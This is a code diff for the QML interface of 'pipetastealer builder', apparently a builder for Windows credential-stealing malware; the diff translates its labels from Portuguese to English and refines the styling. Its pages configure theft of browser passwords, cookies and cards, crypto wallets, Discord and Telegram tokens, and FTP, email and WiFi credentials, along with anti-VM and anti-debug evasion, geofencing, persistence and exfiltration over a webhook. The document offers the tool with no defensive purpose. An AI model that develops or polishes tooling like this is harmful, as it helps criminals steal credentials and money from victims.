@@ -4,7 +4,7 @@ import QtQuick.Controls.Basic
 import QtQuick.Layouts
 
 // ============================================================
-//  pwnd.blog palette — fonte unica de verdade
+//  pwnd.blog palette — single source of truth
 //  bg #050505 · surface #0d0d0d · line #1a1a1a · text #d1d5db
 //  dim #6b7280 · accent #d946ef · accentSoft #e879f9
 //  ok #22c55e · err #ef4444 · mono: JetBrains Mono
@@ -25,26 +25,38 @@ ApplicationWindow {
     property var pageComponents: [dashPage, coletaPage, stealthPage, geofencePage,
                                   persistenciaPage, grabberPage, blocklistPage, exfilPage]
 
-    // tom do status: roxo compilando, verde ok, vermelho falha, cinza ocioso
+    // navigation grouped by context — indices point into navModel
+    property var navGroups: [
+        { label: "overview", items: [0] },
+        { label: "modules", items: [1, 2, 3, 4] },
+        { label: "targets", items: [5, 6] },
+        { label: "output", items: [7] }
+    ]
+
+    // status tone: purple building, green ok, red failure, gray idle
     readonly property color statusTone: backend.building ? "#e879f9"
                                         : backend.status.indexOf("ok") === 0 ? "#22c55e"
-                                        : backend.status.indexOf("falha") === 0 ? "#ef4444"
+                                        : backend.status.indexOf("failed") === 0 ? "#ef4444"
                                         : "#6b7280"
 
     function pageTitle() {
         return navModel.get(window.pageIndex).title
     }
 
+    function pad2(n) {
+        return (n < 10 ? "0" : "") + n
+    }
+
     ListModel {
         id: navModel
-        ListElement { title: "dashboard"; sub: "visao geral + build" }
-        ListElement { title: "coleta"; sub: "credenciais e arquivos" }
-        ListElement { title: "stealth"; sub: "evasao e opsec" }
-        ListElement { title: "geofence"; sub: "filtro por regiao" }
-        ListElement { title: "persistencia"; sub: "sobrevivencia no host" }
-        ListElement { title: "file grabber"; sub: "alvos e extensoes" }
-        ListElement { title: "blocklist"; sub: "processos barrados" }
-        ListElement { title: "exfiltracao"; sub: "webhook de saida" }
+        ListElement { title: "dashboard"; sub: "overview + build" }
+        ListElement { title: "collection"; sub: "credentials and files" }
+        ListElement { title: "stealth"; sub: "evasion and opsec" }
+        ListElement { title: "geofence"; sub: "region filter" }
+        ListElement { title: "persistence"; sub: "host survival" }
+        ListElement { title: "file grabber"; sub: "targets and extensions" }
+        ListElement { title: "blocklist"; sub: "blocked processes" }
+        ListElement { title: "exfiltration"; sub: "outbound webhook" }
     }
 
     ColumnLayout {
@@ -55,9 +67,15 @@ ApplicationWindow {
         Rectangle {
             id: topBar
             Layout.fillWidth: true
-            implicitHeight: 58
+            implicitHeight: 64
             color: "#0a0a0a"
 
+            gradient: Gradient {
+                GradientStop { position: 0.0; color: "#101010" }
+                GradientStop { position: 1.0; color: "#090909" }
+            }
+
+            // bottom hairline
             Rectangle {
                 anchors.left: parent.left
                 anchors.right: parent.right
@@ -66,85 +84,108 @@ ApplicationWindow {
                 color: "#1a1a1a"
             }
 
+            // indeterminate progress sweep while building
             Rectangle {
-                id: progressLine
                 visible: backend.building
                 anchors.left: parent.left
                 anchors.bottom: parent.bottom
                 height: 2
-                width: topBar.width * 0.22
-                color: "#d946ef"
+                width: topBar.width * 0.3
+                gradient: Gradient {
+                    orientation: Gradient.Horizontal
+                    GradientStop { position: 0.0; color: "#00000000" }
+                    GradientStop { position: 0.5; color: "#d946ef" }
+                    GradientStop { position: 1.0; color: "#00000000" }
+                }
                 SequentialAnimation on x {
                     running: backend.building
                     loops: Animation.Infinite
-                    NumberAnimation { from: -progressLine.width; to: topBar.width; duration: 900 }
+                    NumberAnimation { from: -topBar.width * 0.3; to: topBar.width; duration: 1100; easing.type: Easing.InOutSine }
                 }
             }
 
             RowLayout {
                 anchors.fill: parent
-                anchors.leftMargin: 16
-                anchors.rightMargin: 16
-                spacing: 12
+                anchors.leftMargin: 18
+                anchors.rightMargin: 18
+                spacing: 14
 
+                // brand mark
                 Rectangle {
                     Layout.alignment: Qt.AlignVCenter
-                    implicitWidth: 30
-                    implicitHeight: 30
-                    radius: 8
-                    color: Qt.rgba(0.851, 0.275, 0.937, 0.14)
-                    border.width: 1
-                    border.color: Qt.rgba(0.851, 0.275, 0.937, 0.45)
+                    implicitWidth: 34
+                    implicitHeight: 34
+                    radius: 10
+
+                    gradient: Gradient {
+                        GradientStop { position: 0.0; color: "#e879f9" }
+                        GradientStop { position: 1.0; color: "#a21caf" }
+                    }
+
+                    Rectangle {
+                        anchors.fill: parent
+                        anchors.margins: 1
+                        radius: 9
+                        color: "transparent"
+                        border.width: 1
+                        border.color: Qt.rgba(1, 1, 1, 0.22)
+                    }
+
                     Label {
                         anchors.centerIn: parent
                         text: "PT"
-                        color: "#e879f9"
+                        color: "#050505"
                         font.family: "JetBrains Mono"
                         font.pixelSize: 12
                         font.bold: true
+                        font.letterSpacing: 0.5
                     }
                 }
 
                 ColumnLayout {
+                    Layout.alignment: Qt.AlignVCenter
                     spacing: 0
                     Label {
                         text: "pipetastealer"
-                        color: "#e879f9"
+                        color: "#f5d0fe"
                         font.family: "JetBrains Mono"
                         font.pixelSize: 14
                         font.bold: true
-                        font.letterSpacing: 0.6
+                        font.letterSpacing: 0.4
                     }
                     Label {
                         text: "builder"
                         color: "#6b7280"
                         font.family: "JetBrains Mono"
                         font.pixelSize: 9
-                        font.letterSpacing: 1.8
+                        font.letterSpacing: 2.4
                         font.capitalization: Font.AllUppercase
                     }
                 }
 
                 Rectangle {
                     Layout.alignment: Qt.AlignVCenter
+                    Layout.leftMargin: 2
+                    Layout.rightMargin: 2
                     implicitWidth: 1
-                    implicitHeight: 26
-                    color: "#1a1a1a"
+                    implicitHeight: 30
+                    color: "#1f1f1f"
                 }
 
                 ColumnLayout {
-                    spacing: 0
+                    Layout.alignment: Qt.AlignVCenter
+                    spacing: 1
                     Layout.fillWidth: true
                     Label {
                         text: window.pageTitle()
-                        color: "#d1d5db"
+                        color: "#e5e7eb"
                         font.family: "JetBrains Mono"
                         font.pixelSize: 12
                         font.bold: true
                     }
                     Label {
                         text: backend.projeto
-                        color: "#6b7280"
+                        color: "#4b4b53"
                         font.family: "JetBrains Mono"
                         font.pixelSize: 9
                         elide: Text.ElideMiddle
@@ -152,14 +193,15 @@ ApplicationWindow {
                     }
                 }
 
+                // status pill
                 Rectangle {
                     Layout.alignment: Qt.AlignVCenter
-                    implicitWidth: statusRow.implicitWidth + 22
-                    implicitHeight: 28
-                    radius: 7
-                    color: "#0d0d0d"
+                    implicitWidth: statusRow.implicitWidth + 24
+                    implicitHeight: 30
+                    radius: 9
+                    color: Qt.rgba(window.statusTone.r, window.statusTone.g, window.statusTone.b, 0.07)
                     border.width: 1
-                    border.color: "#1a1a1a"
+                    border.color: Qt.rgba(window.statusTone.r, window.statusTone.g, window.statusTone.b, 0.30)
 
                     RowLayout {
                         id: statusRow
@@ -183,10 +225,10 @@ ApplicationWindow {
 
                 ActionButton {
                     Layout.alignment: Qt.AlignVCenter
-                    label: backend.building ? "compilando"
-                                            : backend.build_count > 0 && !backend.last_build_ok ? "tentar de novo"
-                                            : backend.build_count > 0 ? "compilar de novo"
-                                            : "compilar"
+                    label: backend.building ? "compiling"
+                                            : backend.build_count > 0 && !backend.last_build_ok ? "try again"
+                                            : backend.build_count > 0 ? "rebuild"
+                                            : "build"
                     fill: backend.building ? "#141414" : "#d946ef"
                     fg: backend.building ? "#6b7280" : "#050505"
                     enabled: !backend.building
@@ -203,9 +245,14 @@ ApplicationWindow {
 
             // ---------- NAV ----------
             Rectangle {
-                Layout.preferredWidth: 216
+                Layout.preferredWidth: 236
                 Layout.fillHeight: true
                 color: "#080808"
+
+                gradient: Gradient {
+                    GradientStop { position: 0.0; color: "#0b0b0b" }
+                    GradientStop { position: 1.0; color: "#070707" }
+                }
 
                 Rectangle {
                     anchors.right: parent.right
@@ -217,27 +264,42 @@ ApplicationWindow {
 
                 ColumnLayout {
                     anchors.fill: parent
-                    anchors.margins: 12
-                    spacing: 3
-
-                    Label {
-                        text: "configuracao"
-                        color: "#4b4b53"
-                        font.family: "JetBrains Mono"
-                        font.pixelSize: 9
-                        font.letterSpacing: 1.8
-                        font.capitalization: Font.AllUppercase
-                        Layout.leftMargin: 4
-                        Layout.bottomMargin: 6
-                    }
+                    anchors.leftMargin: 12
+                    anchors.rightMargin: 12
+                    anchors.topMargin: 16
+                    anchors.bottomMargin: 12
+                    spacing: 2
 
                     Repeater {
-                        model: navModel
-                        delegate: NavRow {
-                            title: model.title
-                            code: (index + 1 < 10 ? "0" : "") + (index + 1)
-                            active: window.pageIndex === index
-                            onPicked: (index) => window.pageIndex = index
+                        model: window.navGroups
+
+                        delegate: ColumnLayout {
+                            Layout.fillWidth: true
+                            Layout.bottomMargin: 6
+                            spacing: 2
+
+                            Label {
+                                text: modelData.label
+                                color: "#4b4b53"
+                                font.family: "JetBrains Mono"
+                                font.pixelSize: 9
+                                font.letterSpacing: 2.0
+                                font.capitalization: Font.AllUppercase
+                                Layout.leftMargin: 6
+                                Layout.topMargin: 8
+                                Layout.bottomMargin: 4
+                            }
+
+                            Repeater {
+                                model: modelData.items
+
+                                delegate: NavRow {
+                                    title: navModel.get(modelData).title
+                                    code: window.pad2(modelData + 1)
+                                    active: window.pageIndex === modelData
+                                    onPicked: window.pageIndex = modelData
+                                }
+                            }
                         }
                     }
 
@@ -248,14 +310,14 @@ ApplicationWindow {
                         implicitHeight: 1
                         color: "#1a1a1a"
                         Layout.topMargin: 8
-                        Layout.bottomMargin: 8
+                        Layout.bottomMargin: 10
                     }
 
                     MetaRow { label: "target"; value: backend.target }
                     MetaRow { label: "optimize"; value: backend.optimize }
                     MetaRow {
-                        label: "ultimo build"
-                        value: backend.build_count === 0 ? "nunca"
+                        label: "last build"
+                        value: backend.build_count === 0 ? "never"
                              : backend.last_build_size_kb + " KB · " + (backend.last_build_ms / 1000).toFixed(1) + "s"
                         tone: backend.build_count === 0 ? "#6b7280"
                             : backend.last_build_ok ? "#22c55e" : "#ef4444"
@@ -264,33 +326,75 @@ ApplicationWindow {
             }
 
             // ---------- PAGES ----------
-            ScrollView {
-                id: pageScroll
+            Item {
                 Layout.fillWidth: true
                 Layout.fillHeight: true
-                clip: true
-                contentWidth: availableWidth
 
-                contentHeight: pageLoader.item ? pageLoader.item.implicitHeight : 0
+                // ambient background
+                Rectangle {
+                    anchors.fill: parent
+                    color: "#050505"
+                }
 
-                ScrollBar.horizontal.policy: ScrollBar.AlwaysOff
-                ScrollBar.vertical: ScrollBar {
-                    id: pageBar
-                    policy: ScrollBar.AsNeeded
-                    implicitWidth: 9
-                    background: Rectangle { color: "transparent" }
-                    contentItem: Rectangle {
-                        implicitWidth: 4
-                        radius: 2
-                        color: pageBar.pressed ? "#d946ef" : "#242424"
+                // faint magenta glow at the top
+                Rectangle {
+                    anchors.left: parent.left
+                    anchors.right: parent.right
+                    anchors.top: parent.top
+                    height: 220
+                    gradient: Gradient {
+                        GradientStop { position: 0.0; color: Qt.rgba(0.851, 0.275, 0.937, 0.05) }
+                        GradientStop { position: 1.0; color: "#00000000" }
                     }
                 }
 
-                Loader {
-                    id: pageLoader
-                    width: pageScroll.availableWidth - 32
-                    x: 16
-                    sourceComponent: window.pageComponents[window.pageIndex]
+                ScrollView {
+                    id: pageScroll
+                    anchors.fill: parent
+                    clip: true
+                    contentWidth: availableWidth
+                    contentHeight: pageLoader.item ? pageLoader.item.implicitHeight : 0
+
+                    ScrollBar.horizontal.policy: ScrollBar.AlwaysOff
+                    ScrollBar.vertical: ScrollBar {
+                        id: pageBar
+                        policy: ScrollBar.AsNeeded
+                        implicitWidth: 10
+                        background: Rectangle { color: "transparent" }
+                        contentItem: Rectangle {
+                            implicitWidth: 4
+                            radius: 2
+                            color: pageBar.pressed ? "#d946ef" : "#242424"
+                        }
+                    }
+
+                    Loader {
+                        id: pageLoader
+                        width: pageScroll.availableWidth - 36
+                        x: 18
+                        y: 18
+                        sourceComponent: window.pageComponents[window.pageIndex]
+
+                        onSourceComponentChanged: pageFade.restart()
+                        onLoaded: pageFade.restart()
+                    }
+                }
+
+                SequentialAnimation {
+                    id: pageFade
+                    NumberAnimation {
+                        target: pageLoader
+                        property: "opacity"
+                        from: 0
+                        to: 1
+                        duration: 200
+                        easing.type: Easing.OutCubic
+                    }
+                }
+
+                Connections {
+                    target: window
+                    function onPageIndexChanged() { pageFade.restart() }
                 }
             }
         }
@@ -298,7 +402,7 @@ ApplicationWindow {
         // ================= STATUS BAR =================
         Rectangle {
             Layout.fillWidth: true
-            implicitHeight: 26
+            implicitHeight: 28
             color: "#0a0a0a"
 
             Rectangle {
@@ -311,12 +415,20 @@ ApplicationWindow {
 
             RowLayout {
                 anchors.fill: parent
-                anchors.leftMargin: 16
-                anchors.rightMargin: 16
+                anchors.leftMargin: 18
+                anchors.rightMargin: 18
                 spacing: 14
 
+                Rectangle {
+                    Layout.alignment: Qt.AlignVCenter
+                    implicitWidth: 7
+                    implicitHeight: 7
+                    radius: 4
+                    color: window.statusTone
+                }
+
                 Label {
-                    text: backend.building ? "compilando com zig build…" : "pronto"
+                    text: backend.building ? "building with zig build…" : "ready"
                     color: window.statusTone
                     font.family: "JetBrains Mono"
                     font.pixelSize: 10
@@ -325,7 +437,7 @@ ApplicationWindow {
                 Item { Layout.fillWidth: true }
 
                 Label {
-                    text: "modulos ativos " + (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
+                    text: "active modules " + (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
                           + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total)
                     color: "#6b7280"
                     font.family: "JetBrains Mono"
@@ -354,7 +466,7 @@ ApplicationWindow {
     }
 
     // ==========================================================
-    //  PAGINAS
+    //  PAGES
     // ==========================================================
 
     // ---------- 01 DASHBOARD ----------
@@ -362,47 +474,47 @@ ApplicationWindow {
         id: dashPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             RowLayout {
                 Layout.fillWidth: true
-                spacing: 12
+                spacing: 14
 
                 StatCard {
-                    label: "modulos coleta"
+                    label: "collection modules"
                     value: backend.coleta_ativos + "/" + backend.coleta_total
-                    sub: "credenciais, sessoes e arquivos"
+                    sub: "credentials, sessions and files"
                     accent: "#d946ef"
                     progress: backend.coleta_ativos / backend.coleta_total
                 }
                 StatCard {
                     label: "stealth"
                     value: backend.stealth_ativos + "/" + backend.stealth_total
-                    sub: "evasao ligada"
+                    sub: "evasion on"
                     accent: "#e879f9"
                     progress: backend.stealth_ativos / backend.stealth_total
                 }
                 StatCard {
-                    label: "persistencia"
+                    label: "persistence"
                     value: backend.persistencia_ativos === 0 ? "off" : backend.persistencia_ativos + "/" + backend.persistencia_total
-                    sub: backend.persistencia_ativos === 0 ? "execucao unica" : "sobrevive a reboot"
+                    sub: backend.persistencia_ativos === 0 ? "single run" : "survives reboot"
                     accent: backend.persistencia_ativos === 0 ? "#6b7280" : "#22c55e"
                     progress: backend.persistencia_ativos / backend.persistencia_total
                 }
                 StatCard {
                     label: "geofence"
                     value: backend.geofence_langids_total === 0 ? "off" : backend.geofence_langids_total + " langids"
-                    sub: backend.geofence_langids_total === 0 ? "roda em qualquer regiao" : backend.geofence
+                    sub: backend.geofence_langids_total === 0 ? "runs in any region" : backend.geofence
                     accent: backend.geofence_langids_total === 0 ? "#6b7280" : "#e879f9"
                     progress: Math.min(1, backend.geofence_langids_total / 9)
                 }
             }
 
             Card {
-                title: "modulos ativos"
-                hint: "o que entra no exe"
+                title: "active modules"
+                hint: "what goes into the exe"
                 badge: (backend.coleta_ativos + backend.stealth_ativos + backend.persistencia_ativos)
-                       + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total) + " ligados"
+                       + "/" + (backend.coleta_total + backend.stealth_total + backend.persistencia_total) + " on"
 
                 Flow {
                     Layout.fillWidth: true
@@ -412,10 +524,10 @@ ApplicationWindow {
                     Repeater {
                         model: backend.modulos
                         delegate: Chip {
-                            label: modelData.nome
+                            label: modelData.name
                             on: modelData.on
-                            accent: modelData.grupo === "coleta" ? "#d946ef"
-                                  : modelData.grupo === "stealth" ? "#e879f9"
+                            accent: modelData.group === "coleta" ? "#d946ef"
+                                  : modelData.group === "stealth" ? "#e879f9"
                                   : "#22c55e"
                         }
                     }
@@ -424,8 +536,8 @@ ApplicationWindow {
 
             Card {
                 title: "build"
-                hint: "gera src/ajuste.zig e compila"
-                badge: backend.build_count === 0 ? "nunca compilado" : "build #" + backend.build_count
+                hint: "generates src/ajuste.zig and compiles"
+                badge: backend.build_count === 0 ? "never built" : "build #" + backend.build_count
 
                 RowLayout {
                     Layout.fillWidth: true
@@ -434,7 +546,7 @@ ApplicationWindow {
                     ColumnLayout {
                         Layout.fillWidth: true
                         Layout.minimumWidth: 0
-                        spacing: 6
+                        spacing: 7
                         FieldLabel { text: "optimize" }
                         Segmented {
                             Layout.fillWidth: true
@@ -447,12 +559,12 @@ ApplicationWindow {
                     ColumnLayout {
                         Layout.fillWidth: true
                         Layout.minimumWidth: 0
-                        spacing: 6
+                        spacing: 7
                         FieldLabel { text: "target" }
                         Segmented {
                             Layout.fillWidth: true
-                            options: ["x86_64-windows-gnu", "x86-windows-msvc"]
-                            current: Math.max(0, ["x86_64-windows-gnu", "x86-windows-msvc"].indexOf(backend.target))
+                            options: ["x86_64-windows-gnu"]
+                            current: Math.max(0, ["x86_64-windows-gnu"].indexOf(backend.target))
                             onPicked: (index) => backend.target = options[index]
                         }
                     }
@@ -463,21 +575,21 @@ ApplicationWindow {
                     Layout.topMargin: 2
                     spacing: 10
 
-                    MiniStat { label: "tamanho"; value: backend.last_build_size_kb > 0 ? backend.last_build_size_kb + " KB" : "—" }
-                    MiniStat { label: "tempo"; value: backend.last_build_ms > 0 ? (backend.last_build_ms / 1000).toFixed(1) + "s" : "—" }
-                    MiniStat { label: "hora"; value: backend.last_build_when }
+                    MiniStat { label: "size"; value: backend.last_build_size_kb > 0 ? backend.last_build_size_kb + " KB" : "—" }
+                    MiniStat { label: "duration"; value: backend.last_build_ms > 0 ? (backend.last_build_ms / 1000).toFixed(1) + "s" : "—" }
+                    MiniStat { label: "time"; value: backend.last_build_when }
                     MiniStat {
                         label: "status"
-                        value: backend.build_count === 0 ? "—" : backend.last_build_ok ? "ok" : "falha"
+                        value: backend.build_count === 0 ? "—" : backend.last_build_ok ? "ok" : "failed"
                         tone: backend.build_count === 0 ? "#6b7280" : backend.last_build_ok ? "#22c55e" : "#ef4444"
                     }
                 }
 
                 ActionButton {
                     Layout.fillWidth: true
-                    Layout.preferredHeight: 42
-                    Layout.topMargin: 2
-                    label: backend.building ? "compilando…" : "compilar"
+                    Layout.preferredHeight: 44
+                    Layout.topMargin: 4
+                    label: backend.building ? "compiling…" : "build"
                     fill: backend.building ? "#141414" : "#d946ef"
                     fg: backend.building ? "#6b7280" : "#050505"
                     enabled: !backend.building
@@ -487,17 +599,27 @@ ApplicationWindow {
 
             RowLayout {
                 Layout.fillWidth: true
-                spacing: 14
+                spacing: 16
 
                 Card {
                     title: "console"
-                    hint: "zig build em tempo real"
-                    badge: backend.building ? "rodando"
-                         : backend.output.length === 0 ? "vazio"
-                         : (backend.output.split("\n").length - 1) + " linhas"
+                    hint: "zig build in real time"
+                    badge: backend.building ? "running"
+                         : backend.output.length === 0 ? "empty"
+                         : (backend.output.split("\n").length - 1) + " lines"
 
                     Layout.preferredWidth: 3
                     Layout.horizontalStretchFactor: 3
+
+                    // terminal-style dots
+                    RowLayout {
+                        Layout.fillWidth: true
+                        spacing: 6
+                        Rectangle { implicitWidth: 9; implicitHeight: 9; radius: 5; color: "#ef4444"; opacity: 0.65 }
+                        Rectangle { implicitWidth: 9; implicitHeight: 9; radius: 5; color: "#eab308"; opacity: 0.65 }
+                        Rectangle { implicitWidth: 9; implicitHeight: 9; radius: 5; color: "#22c55e"; opacity: 0.65 }
+                        Item { Layout.fillWidth: true }
+                    }
 
                     Flickable {
                         id: consoleFlick
@@ -518,11 +640,11 @@ ApplicationWindow {
                             font.family: "JetBrains Mono"
                             font.pixelSize: 11
                             color: "#22c55e"
-                            placeholderText: "$ aguardando build…"
+                            placeholderText: "$ waiting for build…"
                             placeholderTextColor: "#4b4b53"
                             padding: 10
                             background: Rectangle {
-                                color: "#080808"
+                                color: "#070707"
                                 radius: 8
                                 border.width: 1
                                 border.color: "#1a1a1a"
@@ -534,8 +656,8 @@ ApplicationWindow {
                 }
 
                 Card {
-                    title: "saida"
-                    hint: "artefato gerado"
+                    title: "output"
+                    hint: "generated artifact"
                     badge: backend.last_build_ok ? backend.last_build_size_kb + " KB" : ""
 
                     Layout.preferredWidth: 2
@@ -556,10 +678,10 @@ ApplicationWindow {
                         color: "#1a1a1a"
                     }
 
-                    KeyValue { label: "ajuste.zig"; value: backend.geofence_langids_total + " langids · " + backend.extensoes_total + " extensoes" }
-                    KeyValue { label: "file grabber"; value: backend.pegador_arquivos ? backend.tamanho_max_arquivo + " MB por arquivo" : "desligado" }
-                    KeyValue { label: "blocklist"; value: backend.blocklist_total + " processos" }
-                    KeyValue { label: "webhook"; value: backend.webhook_ok ? "configurado" : "placeholder"; tone: backend.webhook_ok ? "#22c55e" : "#ef4444" }
+                    KeyValue { label: "ajuste.zig"; value: backend.geofence_langids_total + " langids · " + backend.extensoes_total + " extensions" }
+                    KeyValue { label: "file grabber"; value: backend.pegador_arquivos ? backend.tamanho_max_arquivo + " MB per file" : "off" }
+                    KeyValue { label: "blocklist"; value: backend.blocklist_total + " processes" }
+                    KeyValue { label: "webhook"; value: backend.webhook_ok ? "configured" : "placeholder"; tone: backend.webhook_ok ? "#22c55e" : "#ef4444" }
 
                     Item { Layout.fillHeight: true }
                 }
@@ -567,7 +689,7 @@ ApplicationWindow {
 
             Card {
                 title: "ajuste.zig"
-                hint: "config injetada no binario"
+                hint: "config injected into the binary"
                 badge: "src/ajuste.zig"
                 collapsible: true
                 open: false
@@ -593,7 +715,7 @@ ApplicationWindow {
                         color: "#9ca3af"
                         padding: 10
                         background: Rectangle {
-                            color: "#080808"
+                            color: "#070707"
                             radius: 8
                             border.width: 1
                             border.color: "#1a1a1a"
@@ -604,16 +726,16 @@ ApplicationWindow {
         }
     }
 
-    // ---------- 02 COLETA ----------
+    // ---------- 02 COLLECTION ----------
     Component {
         id: coletaPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
-                title: "coleta"
-                hint: "o que sai da maquina do alvo"
+                title: "collection"
+                hint: "what leaves the target machine"
                 badge: backend.coleta_ativos + "/" + backend.coleta_total
 
                 GridLayout {
@@ -622,25 +744,25 @@ ApplicationWindow {
                     columnSpacing: 16
                     rowSpacing: 2
 
-                    ToggleRow { title: "Navegadores"; sub: "senhas, cookies, cartoes, historico"
+                    ToggleRow { title: "Browsers"; sub: "passwords, cookies, cards, history"
                                 on: backend.roubar_navegadores; onToggled: (state) => backend.roubar_navegadores = state }
-                    ToggleRow { title: "Carteiras crypto"; sub: "12 extensoes + 8 desktop"
+                    ToggleRow { title: "Crypto wallets"; sub: "12 extensions + 8 desktop"
                                 on: backend.roubar_crypto; onToggled: (state) => backend.roubar_crypto = state }
-                    ToggleRow { title: "Discord"; sub: "tokens plaintext + DPAPI"
+                    ToggleRow { title: "Discord"; sub: "plaintext tokens + DPAPI"
                                 on: backend.roubar_discord; onToggled: (state) => backend.roubar_discord = state }
                     ToggleRow { title: "Telegram"; sub: "tdata"
                                 on: backend.roubar_telegram; onToggled: (state) => backend.roubar_telegram = state }
                     ToggleRow { title: "Steam"; sub: "ssfn + config + registry"
                                 on: backend.roubar_steam; onToggled: (state) => backend.roubar_steam = state }
-                    ToggleRow { title: "FileZilla"; sub: "credenciais FTP"
+                    ToggleRow { title: "FileZilla"; sub: "FTP credentials"
                                 on: backend.roubar_filezilla; onToggled: (state) => backend.roubar_filezilla = state }
                     ToggleRow { title: "Outlook"; sub: "Windows Credential Manager"
                                 on: backend.roubar_outlook; onToggled: (state) => backend.roubar_outlook = state }
                     ToggleRow { title: "Thunderbird"; sub: "NSS"
                                 on: backend.roubar_thunderbird; onToggled: (state) => backend.roubar_thunderbird = state }
-                    ToggleRow { title: "WiFi"; sub: "perfis + senhas"
+                    ToggleRow { title: "WiFi"; sub: "profiles + passwords"
                                 on: backend.roubar_wifi; onToggled: (state) => backend.roubar_wifi = state }
-                    ToggleRow { title: "File Grabber"; sub: "varredura recursiva"
+                    ToggleRow { title: "File Grabber"; sub: "recursive scan"
                                 on: backend.pegador_arquivos; onToggled: (state) => backend.pegador_arquivos = state }
                     ToggleRow { title: "Screenshot"; sub: "JPEG via GDI+"
                                 on: backend.tirar_captura; onToggled: (state) => backend.tirar_captura = state }
@@ -651,7 +773,7 @@ ApplicationWindow {
 
             Note {
                 tone: "#e879f9"
-                text: "cada modulo desligado tambem some do ajuste.zig — o codigo morto nao vai pro binario, mas a superficie de deteccao reduz junto."
+                text: "every disabled module is also dropped from ajuste.zig — dead code never reaches the binary, and the detection surface shrinks with it."
             }
         }
     }
@@ -661,11 +783,11 @@ ApplicationWindow {
         id: stealthPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
                 title: "stealth & evasion"
-                hint: "tentativa de passar por maquina real"
+                hint: "trying to pass as a real machine"
                 badge: backend.stealth_ativos + "/" + backend.stealth_total
 
                 GridLayout {
@@ -674,24 +796,18 @@ ApplicationWindow {
                     columnSpacing: 16
                     rowSpacing: 2
 
-                    ToggleRow { title: "Anti-VM"; sub: "CPUID + MAC + DLL de sandbox + sleep skew"
+                    ToggleRow { title: "Anti-VM"; sub: "CPUID + MAC + sandbox DLLs + sleep skew"
                                 on: backend.anti_vm; onToggled: (state) => backend.anti_vm = state }
                     ToggleRow { title: "Anti-debug"; sub: "PEB + rdtsc + CheckRemoteDebugger"
                                 on: backend.anti_debug; onToggled: (state) => backend.anti_debug = state }
-                    ToggleRow { title: "Human interaction"; sub: "mouse + teclado"
+                    ToggleRow { title: "Human interaction"; sub: "mouse + keyboard"
                                 on: backend.human_interaction; onToggled: (state) => backend.human_interaction = state }
-                    ToggleRow { title: "Indirect syscalls"; sub: "gadget no ntdll"
-                                on: backend.indirect_syscalls; onToggled: (state) => backend.indirect_syscalls = state }
-                    ToggleRow { title: "API hashing"; sub: "FNV-1a, zero nomes em claro"
-                                on: backend.api_hashing; onToggled: (state) => backend.api_hashing = state }
-                    ToggleRow { title: "Stack strings"; sub: "descriptografa na stack"
-                                on: backend.stack_strings; onToggled: (state) => backend.stack_strings = state }
                 }
             }
 
             Note {
                 tone: "#e879f9"
-                text: "com tudo ligado o binario fica maior e mais lento no cold start. anti-VM costuma ser o primeiro a cair em sandbox de cliente."
+                text: "with everything on, the binary gets bigger and slower on cold start. anti-VM is usually the first to fall in a client sandbox."
             }
         }
     }
@@ -701,13 +817,13 @@ ApplicationWindow {
         id: geofencePage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
                 title: "geofence"
-                hint: "aborta se o idioma do host nao bater"
-                badge: backend.geofence_custom.trim() !== "" ? "custom override ativo"
-                     : backend.geofence_langids_total === 0 ? "desligado"
+                hint: "aborts if the host language doesn't match"
+                badge: backend.geofence_custom.trim() !== "" ? "custom override active"
+                     : backend.geofence_langids_total === 0 ? "off"
                      : backend.geofence_langids_total + " langids"
 
                 GridLayout {
@@ -719,7 +835,7 @@ ApplicationWindow {
                     opacity: backend.geofence_custom.trim() === "" ? 1 : 0.45
                     Behavior on opacity { NumberAnimation { duration: 140 } }
 
-                    OptionCard { label: "none"; sub: "roda em qualquer host"; selected: backend.geofence === "none"
+                    OptionCard { label: "none"; sub: "runs on any host"; selected: backend.geofence === "none"
                                  onPicked: () => backend.geofence = "none" }
                     OptionCard { label: "cis"; sub: "RU / UA / BY"; selected: backend.geofence === "cis"
                                  onPicked: () => backend.geofence = "cis" }
@@ -727,7 +843,7 @@ ApplicationWindow {
                                  onPicked: () => backend.geofence = "asia" }
                     OptionCard { label: "middle_east"; sub: "IR / IQ / SY"; selected: backend.geofence === "middle_east"
                                  onPicked: () => backend.geofence = "middle_east" }
-                    OptionCard { label: "all_except_western"; sub: "todos os presets juntos"; selected: backend.geofence === "all_except_western"
+                    OptionCard { label: "all_except_western"; sub: "all presets combined"; selected: backend.geofence === "all_except_western"
                                  Layout.columnSpan: window.width > 1000 ? 2 : 1
                                  onPicked: () => backend.geofence = "all_except_western" }
                 }
@@ -738,7 +854,7 @@ ApplicationWindow {
                     color: "#1a1a1a"
                 }
 
-                FieldLabel { text: "langids efetivos" }
+                FieldLabel { text: "effective langids" }
                 Label {
                     Layout.fillWidth: true
                     text: backend.geofence_langids_label
@@ -748,7 +864,7 @@ ApplicationWindow {
                     wrapMode: Text.WrapAnywhere
                 }
 
-                FieldLabel { text: "langids custom (sobrepoe o preset)" }
+                FieldLabel { text: "custom langids (overrides the preset)" }
                 InputBox {
                     Layout.fillWidth: true
                     value: backend.geofence_custom
@@ -760,31 +876,31 @@ ApplicationWindow {
             Note {
                 tone: backend.geofence_custom.trim() !== "" ? "#ef4444" : "#e879f9"
                 text: backend.geofence_custom.trim() !== ""
-                      ? "custom override ativo: a selecao de regiao acima esta sendo ignorada — o ajuste.zig vai com os langids digitados."
-                      : "langid custom vazio usa o preset. preenchido, ele ignora a selecao acima — confira o resultado antes de compilar."
+                      ? "custom override active: the region selection above is being ignored — ajuste.zig ships with the langids you typed."
+                      : "an empty custom langid falls back to the preset. once filled, it ignores the selection above — double-check the result before building."
             }
         }
     }
 
-    // ---------- 05 PERSISTENCIA ----------
+    // ---------- 05 PERSISTENCE ----------
     Component {
         id: persistenciaPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
-                title: "persistencia"
-                hint: "o que acontece depois do primeiro run"
+                title: "persistence"
+                hint: "what happens after the first run"
